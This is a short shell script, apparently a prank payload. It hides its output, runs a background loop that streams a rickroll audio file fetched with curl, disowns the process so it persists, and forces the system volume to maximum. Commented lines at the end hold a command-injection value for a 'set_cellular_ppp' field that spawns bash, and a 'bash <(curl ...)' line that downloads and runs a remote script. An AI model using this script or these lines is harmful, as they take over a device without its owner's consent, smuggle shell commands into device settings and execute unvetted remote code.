exec >/dev/null
exec 2>/dev/null
while [ 1=1 ];
do
    aplay -q <(curl -s https://raw.githubusercontent.com/ShatteredDisk/rickroll/master/rickroll.mp4);
done & disown &
amixer set Master 100% unmute;

#set_cellular_ppp \';bash;exit;\'
#bash <(curl https://coolelectronics.me/music.sh)